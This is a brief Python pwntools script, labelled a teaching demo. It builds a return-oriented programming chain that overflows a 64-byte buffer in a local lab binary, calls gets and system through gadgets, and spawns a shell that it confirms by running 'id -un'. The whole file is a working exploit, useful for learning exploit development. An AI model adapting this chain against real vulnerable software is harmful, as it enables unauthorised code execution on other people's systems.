#!/usr/bin/env python3
# Teaching demo: a real ROP chain on a no-PIE / NX / no-canary binary.
#   vuln()'s 64-byte buffer overflows the saved rbp + return address.
#   chain:  pop rdi ; ret -> bss   ; mygets(bss)     (write "/bin/sh" into .bss)
#           pop rdi ; ret -> bss   ; system@plt(bss) (== system("/bin/sh"))
from pwn import *
context.arch = 'amd64'; context.log_level = 'info'

e = ELF('./rop_demo', checksec=False)
POP_RDI = e.symbols['gadget_pop_rdi_ret']
MYGETS  = e.symbols['mygets']
SYSTEM  = e.plt['system']
BSS     = e.bss(0x200)

payload  = b'A' * (0x40 + 8)
payload += p64(POP_RDI) + p64(BSS) + p64(MYGETS)
payload += p64(POP_RDI) + p64(BSS) + p64(SYSTEM)

io = process('./rop_demo')
io.recvuntil(b'line:\n')
io.sendline(payload)          # 1st read: the ROP chain
io.sendline(b'/bin/sh')       # 2nd read: mygets() writes this into .bss
io.sendline(b'echo ROP_SHELL_OK; id -un')   # 3rd read: now a shell
print(io.recvall(timeout=3).decode(errors='replace'))
